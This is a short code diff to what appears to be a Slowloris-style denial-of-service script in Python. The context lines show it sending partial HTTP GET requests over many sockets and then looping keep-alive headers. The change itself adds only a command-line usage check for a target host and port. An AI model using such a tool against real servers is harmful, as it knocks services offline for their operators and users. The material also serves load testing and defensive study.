@@ -3,6 +3,14 @@ import random
 import time
 import sys
 
+
+if __name__ == "__main__":
+    try:
+        arg1 = sys.argv[2]
+    except IndexError:
+        print("Usage: " + sys.argv[0] + " RHOST RPORT")
+        sys.exit(1)
+
 log_level = 2
 
 def log(text, level=1):
@@ -37,6 +45,7 @@ for s in list_of_sockets:
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
     for header in regular_headers:
         s.send(bytes("{}\r\n".format(header).encode("utf-8")))
+
 
 while True:
     log("Sending keep-alive headers...")
